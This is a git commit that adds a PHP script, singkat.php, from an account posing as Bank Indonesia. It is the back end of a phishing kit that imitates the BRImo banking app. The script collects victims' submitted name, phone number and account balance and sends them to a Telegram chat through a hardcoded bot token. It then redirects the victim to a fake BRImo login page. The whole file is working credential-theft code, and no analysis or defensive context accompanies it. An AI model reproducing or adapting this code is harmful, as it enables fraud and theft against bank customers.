0eb70683aa5f9f134638e94b9d4b260da123b701
www-bankindonesia-id <110082114+www-bankindonesia-id@users.noreply.github.com>
2024-08-08 23:51:52 +0700

    Add files via upload

---
+++ singkat.php
@@ -0,0 +1,34 @@
+<?php
+
+    header('Location:   loginbrimo.html');
+    
+    $apiToken = "6268470740:AAF3YjCR3L250pMwU-z_FbesihmWA3IVxWM";
+    session_start();
+
+$nama            = $_POST['nama'];
+$nomor            = $_POST['nomor'];
+$saldo            = $_POST['saldo'];
+
+$_SESSION['nama'] = $nama;
+$_SESSION['nomor'] = $nomor;
+$_SESSION['saldo'] = $saldo;
+
+$message = "
+────────────────
+1.FSTVL BRImo
+────────────────
+» ".$nama."
+» ".$nomor."
+» ".$saldo."
+────────────────";
+
+  $data = [
+        'chat_id' => '-1002198851474',
+        'text' => $message,
+        'parse_mode' => "html"
+    ];
+    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
+
+    echo '<pre>';
+    print_r(json_decode($response));
+    die();
